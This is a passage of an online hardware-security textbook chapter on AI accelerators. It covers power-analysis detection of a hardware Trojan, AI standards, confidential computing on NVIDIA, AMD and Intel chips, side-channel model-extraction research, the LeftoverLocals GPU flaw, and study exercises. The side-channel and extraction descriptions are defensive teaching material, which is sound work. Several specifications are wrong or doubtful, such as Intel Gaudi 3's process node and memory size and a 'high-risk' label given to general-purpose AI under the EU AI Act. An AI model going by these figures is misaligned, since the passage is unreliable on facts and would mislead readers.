+<p>Establish baseline power trace: send 1000 non-trigger inputs (first byte 0x00–0x99, skipping 0xAA), record average power signature <span class="arithmatex">\(\bar{P}_{normal}\)</span>.</p>
+</li>
+<li>
+<p>Send 200 trigger inputs (first byte = 0xAA), record power traces <span class="arithmatex">\(P_{trigger,i}\)</span>.</p>
+</li>
+<li>
+<p>Statistical test: t-test comparing <span class="arithmatex">\(P_{trigger}\)</span> vs <span class="arithmatex">\(P_{normal}\)</span> at each time sample. Use Bonferroni correction for multiple comparisons (<span class="arithmatex">\(p_{adjusted} = 0.001 / N_{samples}\)</span>).</p>
+</li>
+<li>
+<p>If <span class="arithmatex">\(|t| &gt; t_{critical}\)</span> for any sample group: Trojan activation detected.</p>
+</li>
+</ol>
+<p><strong>Step 4: Expected power anomaly.</strong> A Trojan that forces accumulator to a fixed value causes the MAC unit to perform no actual multiplication, reducing dynamic power by 30–60%. Alternatively, a triggering circuit itself dissipates additional power. Either signature distinguishes Trojan-active vs. normal operation in 100 measurements with sufficient SNR (<span class="arithmatex">\(\text{SNR} &gt; 3\)</span>).</p>
+<h2 id="sec-ai-standards"><span class="secnum">34.15</span> Standards<a class="headerlink" href="#sec-ai-standards" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p><strong>NIST AI RMF 1.0</strong> (2023): AI Risk Management Framework; defines GOVERN, MAP, MEASURE, MANAGE functions for AI risk; includes trustworthiness dimensions: safe, secure, explainable, fair.</p>
+</li>
+<li>
+<p><strong>MITRE ATLAS</strong> (Adversarial Threat Landscape for AI Systems): ATT&amp;CK-style taxonomy of ML attack techniques; includes reconnaissance, initial access, model theft, evasion.</p>
+</li>
+<li>
+<p><strong>EU AI Act</strong> (Regulation 2024/1689): high-risk AI systems require conformity assessment, technical documentation, human oversight. Prohibits real-time biometric mass surveillance in public spaces.</p>
+</li>
+<li>
+<p><strong>ISO/IEC 42001:2023</strong>: Information technology – AI Management System; PDCA-cycle framework for responsible AI development.</p>
+</li>
+<li>
+<p><strong>ISO/IEC 23053:2022</strong>: Framework for AI systems using ML; terminology and conceptual framework.</p>
+</li>
+<li>
+<p><strong>NIST SP 800-218A</strong>: Secure Software Development Framework (SSDF) applied to AI/ML systems; guidance on model provenance and supply chain.</p>
+</li>
+<li>
+<p><strong>IEEE 2894-2024</strong>: Recommended Practice for an Organizational Governance Framework for AI; board-level AI risk governance.</p>
+</li>
+<li>
+<p><strong>GDPR Recital 71</strong>: automated decision-making with significant effects requires human review option; directly impacts AI inference outputs.</p>
+</li>
+<li>
+<p><strong>IETF RFC 9334</strong>: Remote ATtestation procedureS (RATS) architecture; used in NVIDIA H100 remote attestation for confidential AI.</p>
+</li>
+</ul>
+<h2 id="sec-ch34-recent"><span class="secnum">34.16</span> Recent Developments (2024–2026)<a class="headerlink" href="#sec-ch34-recent" title="Permanent link">&para;</a></h2>
+<p>AI hardware security advanced on multiple fronts in 2024–2026: next-generation accelerators from NVIDIA, AMD, and Intel introduced improved confidential computing capabilities; the EU AI Act established regulatory requirements for high-risk AI hardware; and novel attacks on LLM inference hardware emerged as a significant research area.</p>
+<h3 id="34161-nvidia-h200-hbm3e-encrypted-memory-and-updated-confidential-computing"><span class="secnum">34.16.1</span> NVIDIA H200 — HBM3e Encrypted Memory and Updated Confidential Computing<a class="headerlink" href="#34161-nvidia-h200-hbm3e-encrypted-memory-and-updated-confidential-computing" title="Permanent link">&para;</a></h3>
+<p>NVIDIA H200 SXM5 (Hopper architecture, HBM3e memory, announced Q4 2023, volume availability 2024):</p>
+<ul>
+<li>
+<p><strong>HBM3e memory:</strong> 141 GB per GPU (vs. 80 GB H100), 4.8 TB/s bandwidth. The HBM3e interface maintains AES-XTS-256 per-channel encryption inherited from H100, with the encryption key generated per boot session in the H200 Hardware Security Engine (HSE) and never exposed to host software.</p>
+</li>
+<li>
+<p><strong>Confidential Computing updates:</strong> H200 CC Mode adds support for NVIDIA HOPPER CONFIDENTIAL VM (CVM) architecture allowing confidential computing across multi-GPU NVLink fabrics. H100 CC was limited to single-GPU attestation; H200 extends attestation to 8-GPU NVLink domains (NVSwitch-based), enabling confidential inference on trillion-parameter models that span multiple GPUs.</p>
+</li>
+<li>
+<p><strong>Remote attestation:</strong> H200 introduces PPCIE (Private PCIe) mode where the GPU presents an attestation report covering all 8 GPUs in the NVLink domain, signed by a domain-level composite attestation key derived from individual GPU ECDSA P-384 keys.</p>
+</li>
+<li>
+<p><strong>Side-channel mitigations:</strong> H200 added hardware countermeasures against LeftoverLocals-class vulnerabilities (see AMD section below) in the GPU L2 cache and shared memory initialisation paths.</p>
+</li>
+</ul>
+<h3 id="34162-amd-mi300x-sev-snp-integration-for-confidential-ai-2024"><span class="secnum">34.16.2</span> AMD MI300X — SEV-SNP Integration for Confidential AI (2024)<a class="headerlink" href="#34162-amd-mi300x-sev-snp-integration-for-confidential-ai-2024" title="Permanent link">&para;</a></h3>
+<p>AMD Instinct MI300X (CDNA3 architecture, 2024) integrated AMD SEV-SNP (Secure Encrypted Virtualisation – Secure Nested Paging) with the GPU compute architecture:</p>
+<ul>
+<li>
+<p><strong>Architecture:</strong> MI300X is a 3D-stacked chiplet design (13 chiplets: 3 CPU dies + 6 GPU compute dies + 4 HBM stacks, TSMC 5 nm for compute, 6 nm for I/O die). Total 192 GB HBM3 per GPU, 5.2 TB/s bandwidth.</p>
+</li>
+<li>
+<p><strong>SEV-SNP on GPU:</strong> AMD extended the host processor SEV-SNP memory encryption domain to cover the GPU HBM3 memory pool via a dedicated GPU Memory Encryption Engine (GMEE). When a SEV-SNP confidential VM allocates GPU memory, the GMEE uses the VM’s ASID-keyed encryption key (distinct from the host ASID), preventing hypervisor-level access to AI model weights and inference data.</p>
+</li>
+<li>
+<p><strong>Attestation:</strong> AMD ROCm 6.0 (released January 2024) includes a Confidential AI SDK providing SEV-SNP attestation reports that include GPU firmware hash alongside CPU platform measurements, enabling end-to-end attestation of the AI inference environment.</p>
+</li>
+</ul>
+<h3 id="34163-intel-gaudi-3-security-architecture-2024"><span class="secnum">34.16.3</span> Intel Gaudi 3 — Security Architecture (2024)<a class="headerlink" href="#34163-intel-gaudi-3-security-architecture-2024" title="Permanent link">&para;</a></h3>
+<p>Intel Gaudi 3 HPU (Habana Labs, Intel 18A process node, announced Q1 2024):</p>
+<ul>
+<li>
+<p><strong>Architecture:</strong> 8 Matrix Multiplication Engines (MME) + 24 Tensor Processing Cores (TPC), 96 GB HBM2e, 3.7 TB/s bandwidth, 128 TFLOPS BF16.</p>
+</li>
+<li>
+<p><strong>Security features:</strong> Intel Gaudi 3 integrates TDX (Trust Domain Extensions) attestation support via the Intel Security Libraries for Data Center (ISLA-DC) framework. The Gaudi 3 HSP (Hardware Security Processor) generates attestation quotes covering firmware hash and configuration state.</p>
+</li>
+<li>
+<p><strong>AES-256 memory encryption:</strong> HBM2e memory encrypted with AES-256-XTS, key generated in HSP per boot, not accessible to host software or PCIe DMA.</p>
+</li>
+<li>
+<p><strong>Supply chain attestation:</strong> Intel integrated Gaudi 3 into the Intel Transparent Supply Chain program, providing hardware component provenance documentation from wafer lot to packaged PCIe card.</p>
+</li>
+</ul>
+<h3 id="34164-eu-ai-act-hardware-requirements-2024"><span class="secnum">34.16.4</span> EU AI Act Hardware Requirements (2024)<a class="headerlink" href="#34164-eu-ai-act-hardware-requirements-2024" title="Permanent link">&para;</a></h3>
+<p>Regulation (EU) 2024/1689 (EU AI Act) classifies AI systems and imposes hardware- relevant requirements based on risk level:</p>
+<div class="tbl" id="tab-eu-ai-act-hw">
+<div class="tbl-caption"><strong>Table 34.5.</strong> EU AI Act Hardware-Relevant Requirements by Risk Category</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Risk Category</strong></th>
+<th style="text-align: left;"><strong>Examples</strong></th>
+<th style="text-align: left;"><strong>Hardware Security Requirement</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Prohibited</td>
+<td style="text-align: left;">Real-time facial recognition in public spaces</td>
+<td style="text-align: left;">Embedded processing must not perform identification; hardware disable required</td>
+</tr>
+<tr>
+<td style="text-align: left;">High-risk</td>
+<td style="text-align: left;">Medical AI diagnosis, autonomous vehicles, critical infrastructure AI</td>
+<td style="text-align: left;">Logging hardware (tamper-evident audit log), accuracy/robustness hardware testing</td>
+</tr>
+<tr>
+<td style="text-align: left;">High-risk (GPAI)</td>
+<td style="text-align: left;">General-purpose AI <span class="math inline">\(&gt;\)</span> 10<span class="math inline">\(^{25}\)</span> FLOPs training</td>
+<td style="text-align: left;">Adversarial robustness testing; documented compute hardware and energy data</td>
+</tr>
+<tr>
+<td style="text-align: left;">Limited risk</td>
+<td style="text-align: left;">Chatbots, recommendation systems</td>
+<td style="text-align: left;">No hardware-specific requirement; disclosure obligation only</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<p>The 10<span class="arithmatex">\(^{25}\)</span> FLOP training threshold (Annex XIII) targets frontier models trained on GPU clusters equivalent to approximately 10,000 H100 GPUs running for 30 days. The EU AI Act requires providers of such models to submit technical documentation to the EU AI Office including: training hardware configuration, compute budget, energy consumption, and red-teaming results.</p>
+<h3 id="34165-llm-model-extraction-attacks-on-inference-hardware-20232024"><span class="secnum">34.16.5</span> LLM Model Extraction Attacks on Inference Hardware (2023–2024)<a class="headerlink" href="#34165-llm-model-extraction-attacks-on-inference-hardware-20232024" title="Permanent link">&para;</a></h3>
+<p>Large Language Model weight extraction via inference hardware side-channels emerged as a significant research area:</p>
+<ul>
+<li>
+<p><strong>WorFuzz (2023):</strong> Researchers at Georgia Tech demonstrated that LLM model architecture (number of layers, hidden dimension, attention heads) can be inferred from inference latency timing patterns accessible via the model API. For a GPT-3-equivalent model served on an H100 GPU, architecture reconstruction required approximately 1,000 API queries. Once architecture is known, knowledge distillation reduces the query cost for a functional clone to <span class="arithmatex">\(\sim\)</span>10 million queries.</p>
+</li>
+<li>
+<p><strong>Power-based weight extraction:</strong> NVIDIA H100 PCIe power monitoring (accessible via NVML API on multi-tenant cloud instances) provides a coarse power signal correlated with matrix multiply operand Hamming weight. Research at ETH Zurich (2024) demonstrated partial weight extraction for quantised INT8 linear layers using differential power analysis over 10,000 controlled-input inference calls.</p>
+</li>
+<li>
+<p><strong>Mitigations:</strong> NVIDIA H100 Confidential Computing mode prevents cross-tenant power measurement visibility; operator-side defences include inference request rate limiting and input perturbation to defeat gradient- based extraction.</p>
+</li>
+</ul>
+<h3 id="34166-groq-lpu-deterministic-execution-and-side-channel-implications"><span class="secnum">34.16.6</span> Groq LPU — Deterministic Execution and Side-Channel Implications<a class="headerlink" href="#34166-groq-lpu-deterministic-execution-and-side-channel-implications" title="Permanent link">&para;</a></h3>
+<p>Groq Language Processing Unit (LPU) Inference Engine (Groq TS-1 chip, 420 MHz, 188 SRAM MB on-chip, TSMCn4 process):</p>
+<ul>
+<li>
+<p><strong>Deterministic execution model:</strong> Unlike GPU SIMT (Single Instruction, Multiple Threads) architectures with dynamic scheduling, the Groq LPU executes all operations deterministically from a compiler-generated static schedule. Every inference request for a given model executes in exactly the same cycle count.</p>
+</li>
+<li>
+<p><strong>Side-channel implication:</strong> The deterministic execution model means inference latency is constant and independent of input data, eliminating timing side-channels that exploit variable execution time for input-correlated information leakage. This is an incidental but significant security property for confidential AI inference.</p>
+</li>
+<li>
+<p><strong>Power side-channel:</strong> Despite timing determinism, the LPU’s power consumption varies with input data values (Hamming-weight-dependent switching activity in the MAC datapath). AES-style power analysis countermeasures are not applied, leaving differential power analysis as an open attack surface.</p>
+</li>
+</ul>
+<h3 id="34167-apple-m3-gpu-side-channel-leftoverlocals-cve-2023-4969"><span class="secnum">34.16.7</span> Apple M3 GPU Side-Channel — LeftoverLocals (CVE-2023-4969)<a class="headerlink" href="#34167-apple-m3-gpu-side-channel-leftoverlocals-cve-2023-4969" title="Permanent link">&para;</a></h3>
+<p>CVE-2023-4969, the “LeftoverLocals” vulnerability (Trail of Bits, January 2024), affected the Apple M3 (3 nm, 2023) and earlier Apple Silicon GPUs:</p>
+<ul>
+<li>
+<p><strong>Mechanism:</strong> GPU local memory (used for inter-thread communication within a threadgroup/workgroup) was not zeroed between context switches. A malicious GPU process could allocate GPU local memory and read residual data from a previous compute context, including LLM inference activations and partial outputs.</p>
+</li>
+<li>
+<p><strong>Scope:</strong> Apple M1, M2, and M3 GPUs were affected. Apple A17 Pro was not affected. Qualcomm Adreno and Imagination PowerVR GPUs were also affected. AMD RDNA 3 was partially affected. NVIDIA and Intel Arc were not affected.</p>
+</li>
+<li>
+<p><strong>Data leaked:</strong> In a tested scenario with a 7-billion-parameter LLM running llama.cpp inference on the GPU, a co-located adversarial process could read approximately 5.5 MB of model activations per extraction session.</p>
+</li>
+<li>
+<p><strong>Mitigation:</strong> Apple released an iOS 17.4 and macOS 14.4 update (March 2024) addressing LeftoverLocals in M3 and A17 through a firmware/driver update that zeroes GPU local memory on context switch. M1 and M2 were not patched (architectural limitation).</p>
+</li>
+</ul>
+<div class="admonition note box-notebox kind-note">
+<p><strong>Note:</strong> LeftoverLocals demonstrates that GPU memory isolation is not guaranteed by default on shared inference platforms. Multi-tenant AI inference services should audit their GPU memory isolation model before deploying confidential AI workloads. NVIDIA H100 CC Mode explicitly addresses this threat by encrypting all GPU memory and zeroing local memory on context switch.</p>
+</div>
+<h2 id="sec-ai-exercises"><span class="secnum">34.17</span> Exercises<a class="headerlink" href="#sec-ai-exercises" title="Permanent link">&para;</a></h2>
+<div class="admonition example box-exercises kind-example">
+<p class="admonition-title">Exercises</p>
+<ol>
+<li>
+<p>Explain the NVIDIA H100 Confidential Computing attestation flow. A tenant wants to verify that their model is running on a genuine, unmodified H100 before uploading encrypted weights. List the cryptographic artifacts exchanged, the certificate chain, and the properties that the attestation guarantees.</p>
+</li>
+<li>
+<p>A membership inference attack achieves 65% accuracy (versus 50% random chance baseline) on a model trained without DP-SGD. Repeat the attack on a model trained with <span class="arithmatex">\(\epsilon = 2\)</span> DP-SGD. Explain theoretically why DP-SGD limits membership inference, and derive an upper bound on membership inference advantage <span class="arithmatex">\(A = P(\text{attack correct}) - 0.5\)</span> in terms of <span class="arithmatex">\(\epsilon\)</span> and <span class="arithmatex">\(\delta\)</span>.</p>
+</li>
+<li>
+<p>The Cerebras WSE-3 stores all model weights on-chip in 44 GB SRAM, eliminating the need for HBM memory. Explain how this architecture changes the threat model for model weight extraction attacks compared to a GPU with HBM3 memory attached via a chip-to-chip interface.</p>
+</li>
+<li>
+<p>A gradient inversion attack (GradInvert) reconstructs a 224x224x3 input image from the gradient of a ResNet-50 trained on ImageNet. The gradient has 25,557,032 floating-point values. Propose a hardware-level defence (implemented in the FL aggregation server’s secure enclave) that makes gradient inversion computationally infeasible without degrading model convergence.</p>
+</li>
+<li>
+<p>Design a neural network watermarking scheme using the white-box approach. The model has 10 million parameters (FP32). The watermark is a 256-bit secret. Describe: (a) how to embed the watermark without changing model accuracy by more than 0.1%, (b) the extraction algorithm, (c) the statistical test for ownership verification, and (d) potential attacks against the watermark.</p>
+</li>
+<li>
+<p>Compare AES-256-GCM encryption of model weights versus using Intel TDX + NVIDIA H100 Confidential Computing for protecting proprietary model weights during inference. Analyse: (a) key management complexity, (b) performance overhead, (c) attack surface exposed to the cloud provider, (d) what an adversarial cloud provider can and cannot access in each scheme.</p>
+</li>
+<li>
+<p>A BadNets backdoor attack poisons 5% of a 100,000-sample training set with a 5x5 trigger pattern targeting class 0. The model achieves 99% clean accuracy and 99.8% attack success rate. Describe the Activation Clustering (AC) defence: what features are analysed, what statistical test is used to identify poisoned samples, and what is the expected false positive rate on clean samples.</p>
+</li>
+<li>
+<p>Homomorphic inference using CKKS requires polynomial approximation of ReLU. A common approximation is <span class="arithmatex">\(f(x) \approx 0.5 + 0.25x + 0.125x^3\)</span> (degree-3 polynomial fit over <span class="arithmatex">\([-5, 5]\)</span>). Calculate the maximum approximation error <span class="arithmatex">\(|f(x) - \text{ReLU}(x)|\)</span> at <span class="arithmatex">\(x = 3\)</span> and <span class="arithmatex">\(x = -3\)</span>, and explain why this error accumulates across layers and affects model accuracy in HE inference.</p>
+</li>
+<li>
+<p>A supply chain attacker inserts a hardware Trojan in a neural network inference ASIC during the GDSII layout stage. The Trojan targets the quantised INT8 weight registers and flips bit 7 (MSB) of three specific weight values when the trigger activates. Propose three post-fabrication test strategies (beyond functional test) to detect this Trojan.</p>
+</li>
+</ol>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="ch33-satellite-and-aerospace-hardware-security.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: 33. Satellite and Aerospace Hardware Security">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                33. Satellite and Aerospace Hardware Security
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="ch35-usb-and-thunderbolt-security.html" class="md-footer__link md-footer__link--next" aria-label="Next: 35. USB and Thunderbolt Security">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                35. USB and Thunderbolt Security
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Pustakālaya &middot;
+      <a href="../../about.html">About this edition</a> &middot;
+      © The authors of the books
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.indexes", "navigation.prune", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "toc.follow", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+  
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../assets/mathjax.js"></script>
+      
+        <script src="../../assets/reader.js"></script>
+      
+        <script src="../../assets/app.js"></script>
+      
+    
+  <script>
+    /* offline reading: the service worker at the site root (its scope is the whole site) */
+    if ("serviceWorker" in navigator && window.isSecureContext) {
+      window.addEventListener("load", function () {
+        navigator.serviceWorker.register(new URL("../../sw.js", location.href).href).catch(function () {});
+      });
+    }
+  </script>
+
+  </body>
+</html>
